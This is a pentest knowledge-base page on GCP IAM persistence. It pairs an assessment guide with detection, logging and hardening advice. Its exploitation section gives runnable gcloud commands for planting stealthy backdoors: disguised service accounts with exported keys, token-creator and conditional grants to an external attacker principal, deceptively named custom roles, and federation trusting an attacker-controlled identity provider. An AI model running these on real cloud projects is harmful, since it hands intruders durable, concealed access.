---
cstg_id: CSTG-GCP-IAM-PERSIST
title: "GCP Iam - Persistence"
provider: gcp
service: iam
phase: persistence
required_access: assumed-breach
required_permissions:
  - iam.serviceAccounts.create
  - iam.serviceAccountKeys.create
  - resourcemanager.projects.setIamPolicy
  - iam.roles.create
  - iam.roles.update
  - iam.serviceAccounts.setIamPolicy
  - iam.workloadIdentityPools.create
  - iam.workloadIdentityPoolProviders.create
  - iam.serviceAccounts.implicitDelegation
tools:
  - gcloud CLI
  - Google Cloud REST/RPC API
  - GCP IAM graph / audit tooling
references:
  - "https://cloud.google.com/iam/docs/service-accounts-create"
  - "https://cloud.google.com/iam/docs/keys-create-delete"
  - "https://cloud.google.com/iam/docs/workload-identity-federation"
  - "https://cloud.google.com/iam/docs/impersonating-service-accounts"
  - "https://hackingthe.cloud/gcp/"
  - "https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/"
  - "https://cloud.google.com/iam/docs/understanding-custom-roles"
license: CC BY-SA 4.0
---

## Summary

Persistence is the establishment of durable, recoverable access that survives
credential rotation, session expiry, and incident response. In GCP IAM,
persistence is achieved by planting identities, credentials, and trust
relationships that an attacker controls and that blend into legitimate IAM
configuration - new service accounts, exportable keys, hidden role bindings,
custom roles with concealed permissions, and federated trust into
attacker-controlled external identity providers.

The attacker objective is to retain control even after the originally
compromised credential is revoked. Unlike privilege escalation, the focus is
*longevity and stealth*: mechanisms that are easy to overlook in an IAM review
and that regenerate access on demand. This phase follows
[post-exploitation](../05-post-exploitation/gcp-iam-post-exploitation.md) and
typically requires a privileged identity obtained during
[privilege escalation](../03-privilege-escalation/gcp-iam-privesc.md).

## Prerequisites

A privileged identity with IAM-write capability - the ability to create service
accounts and keys, modify IAM policy, create/update roles, or configure
identity federation. These are typically held by `roles/owner`,
`roles/iam.serviceAccountAdmin`, `roles/iam.serviceAccountKeyAdmin`,
`roles/iam.roleAdmin`, or `roles/resourcemanager.projectIamAdmin`.

```bash
curl -s -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  -d '{"permissions":["iam.serviceAccounts.create","iam.serviceAccountKeys.create","resourcemanager.projects.setIamPolicy","iam.roles.create","iam.workloadIdentityPools.create"]}' \
  "https://cloudresourcemanager.googleapis.com/v3/projects/<PROJECT_ID>:testIamPermissions"
```

## Enumeration

Before planting persistence, map existing identities so new artifacts can be
named to blend in, and so the assessor can later prove what was added:

```bash
gcloud iam service-accounts list --project <PROJECT_ID>
gcloud iam roles list --project <PROJECT_ID>
gcloud iam workload-identity-pools list --location=global --project <PROJECT_ID>
gcloud projects get-iam-policy <PROJECT_ID> --format=json
```

## Misconfigurations & Findings

- Environments that permit user-managed SA key creation (no
  `iam.disableServiceAccountKeyCreation` org policy) - enables long-lived
  backdoor keys.
- No alerting on `CreateServiceAccount`, `CreateServiceAccountKey`,
  `CreateRole`, or `SetIamPolicy` - planted artifacts go unnoticed.
- Lack of Workload Identity Federation governance - attacker can add an external
  OIDC provider trust.
- Custom roles editable post-hoc - concealed permissions can be slipped in.
- No periodic reconciliation of IAM bindings against an approved baseline.

## Exploitation

### iam.serviceAccounts.create + iam.serviceAccountKeys.create

Create a benign-looking SA, grant it privilege, and mint a long-lived key held
offline. The key survives rotation of the original foothold.

```bash
gcloud iam service-accounts create svc-monitoring \
  --display-name="Monitoring Agent" --project <PROJECT_ID>
gcloud projects add-iam-policy-binding <PROJECT_ID> \
  --member="serviceAccount:svc-monitoring@<PROJECT_ID>.iam.gserviceaccount.com" \
  --role="roles/editor"
gcloud iam service-accounts keys create backdoor.json \
  --iam-account=svc-monitoring@<PROJECT_ID>.iam.gserviceaccount.com
```

### iam.serviceAccountKeys.create (on an existing SA)

Add an extra key to a legitimate high-privilege SA. Far stealthier than a new
SA, since the SA itself is expected; only the key count changes.

```bash
gcloud iam service-accounts keys create extra.json \
  --iam-account=<EXISTING_PRIV_SA_EMAIL>
gcloud iam service-accounts keys list --iam-account=<EXISTING_PRIV_SA_EMAIL>
```

### iam.serviceAccounts.setIamPolicy (impersonation backdoor)

Rather than minting a key, grant an attacker-controlled principal
`roles/iam.serviceAccountTokenCreator` on a privileged SA. The attacker can
then mint short-lived tokens on demand - no static key to detect or rotate.

```bash
gcloud iam service-accounts add-iam-policy-binding <PRIV_SA_EMAIL> \
  --member="user:attacker@external.example" \
  --role="roles/iam.serviceAccountTokenCreator"
```

### resourcemanager.projects.setIamPolicy (hidden binding)

Add a low-noise binding for an attacker principal. Conditional bindings and
external/Gmail members are easy to miss in review.

```bash
gcloud projects add-iam-policy-binding <PROJECT_ID> \
  --member="serviceAccount:svc-monitoring@<PROJECT_ID>.iam.gserviceaccount.com" \
  --role="roles/owner"

# Conditional binding (only "active" under an obscure condition - evades casual review)
gcloud projects add-iam-policy-binding <PROJECT_ID> \
  --member="user:attacker@external.example" --role="roles/editor" \
  --condition="expression=request.time < timestamp('2030-01-01T00:00:00Z'),title=maint"
```

### iam.roles.create / iam.roles.update (concealed-permission role)

Create or modify a custom role with an innocuous name and description but
containing sensitive permissions, then bind it. Reviewers scanning role *names*
rather than expanding permissions will miss it.

```bash
gcloud iam roles create logViewerPlus --project=<PROJECT_ID> \
  --title="Log Viewer Plus" --description="Read logs" \
  --permissions=logging.logEntries.list,resourcemanager.projects.setIamPolicy,iam.serviceAccountKeys.create
```

### iam.workloadIdentityPools.create + providers.create (federated backdoor)

Configure a Workload Identity Pool trusting an attacker-controlled OIDC issuer,
then allow that external identity to impersonate a privileged SA. No key, no
new GCP user - access is re-established by presenting an external token.

```bash
gcloud iam workload-identity-pools create attacker-pool \
  --location=global --project=<PROJECT_ID> --display-name="CI Pool"

gcloud iam workload-identity-pools providers create-oidc atk \
  --location=global --project=<PROJECT_ID> \
  --workload-identity-pool=attacker-pool \
  --issuer-uri="https://attacker-controlled-idp.example" \
  --attribute-mapping="google.subject=assertion.sub"

gcloud iam service-accounts add-iam-policy-binding <PRIV_SA_EMAIL> \
  --role="roles/iam.workloadIdentityUser" \
  --member="principal://iam.googleapis.com/projects/<PROJECTNUM>/locations/global/workloadIdentityPools/attacker-pool/subject/<ATTACKER_SUBJECT>"
```

### Default SA token-creator grant

A subtle variant: grant `serviceAccountTokenCreator` on the default
Compute/App Engine SA (which already has Editor) to an attacker principal -
the SA is expected to exist, so only the extra binding is anomalous.

## Detection & Logging

All persistence actions are **Admin Activity** logs in **Cloud Audit Logs**
(always on):

- `google.iam.admin.v1.CreateServiceAccount` and `CreateServiceAccountKey` -
  new SAs and keys. Baseline key counts per SA and alert on growth.
- `SetIamPolicy` adding `tokenCreator`, `owner`, `editor`, or
  `workloadIdentityUser`, especially with external/Gmail members or
  conditional bindings.
- `CreateRole` / `UpdateRole` adding sensitive permissions to custom roles -
  expand permission deltas, do not trust titles.
- `CreateWorkloadIdentityPool` / `CreateWorkloadIdentityPoolProvider` -
  alert on any new federated issuer, particularly non-corporate issuer URIs.

```bash
gcloud logging read \
  'protoPayload.methodName=("google.iam.admin.v1.CreateServiceAccountKey" OR
   "google.iam.admin.v1.CreateWorkloadIdentityPoolProvider" OR "SetIamPolicy")' \
  --project=<PROJECT_ID> --freshness=14d --format=json
```

Detect by reconciling IAM state against an approved baseline (drift detection)
and by alerting on bindings to external domains, new federation providers, and
SA-key creation. Security Command Center surfaces several of these as findings.

## Remediation & Hardening

- Enforce `iam.disableServiceAccountKeyCreation`; remove all user-managed keys
  and rely on Workload Identity Federation with short-lived tokens.
- Govern Workload Identity Pools: restrict creation, require attribute
  conditions, and allowlist approved issuer URIs.
- Apply Domain Restricted Sharing (`iam.allowedPolicyMemberDomains`) to block
  external/Gmail members in bindings.
- Continuously reconcile IAM bindings, custom roles, and SAs against a managed
  baseline (Infrastructure-as-Code with drift detection).
- Alert on creation of SAs/keys/roles and on any new `tokenCreator`,
  `owner`, or `workloadIdentityUser` grant.
- Use deny policies and IAM Conditions to constrain who may create persistence
  primitives.

## Tools

- **gcloud CLI** / **REST API** for creating SAs, keys, roles, bindings, and
  federation.
- **IAM graph / audit tooling** to baseline and diff IAM state and to surface
  hidden bindings, concealed-permission roles, and impersonation backdoors.
- **Cloud Asset Inventory** for org-wide detection of new principals and trust
  relationships.

## References

- Create service accounts - https://cloud.google.com/iam/docs/service-accounts-create
- Create and delete SA keys - https://cloud.google.com/iam/docs/keys-create-delete
- Workload Identity Federation - https://cloud.google.com/iam/docs/workload-identity-federation
- Impersonating service accounts - https://cloud.google.com/iam/docs/impersonating-service-accounts
- Hacking the Cloud (GCP) - https://hackingthe.cloud/gcp/
- Rhino Security Labs - GCP privilege escalation part 2 - https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/
- Understanding custom roles - https://cloud.google.com/iam/docs/understanding-custom-roles
